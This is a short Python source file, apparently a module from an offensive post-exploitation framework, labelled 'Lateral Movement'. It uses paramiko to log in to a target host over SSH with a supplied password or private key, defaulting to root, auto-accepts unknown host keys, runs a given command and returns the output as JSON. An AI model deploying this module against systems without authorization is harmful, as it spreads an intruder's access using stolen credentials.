import paramiko
import json
import socket

def run(**args):
    print("[*] In Lateral Movement module.")
    target = args.get("target")
    username = args.get("username", "root")
    password = args.get("password")
    key_content = args.get("key_content")
    command = args.get("command", "id")
    
    if not target:
        return json.dumps({"error": "Target IP required."})
        
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        if key_content:
            from io import StringIO
            key = paramiko.RSAKey.from_private_key(StringIO(key_content))
            client.connect(target, username=username, pkey=key, timeout=5)
        elif password:
            client.connect(target, username=username, password=password, timeout=5)
        else:
            return json.dumps({"error": "Password or Key required."})
            
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode()
        client.close()
        return json.dumps({"target": target, "output": output})
    except Exception as e:
        return json.dumps({"target": target, "error": str(e)})
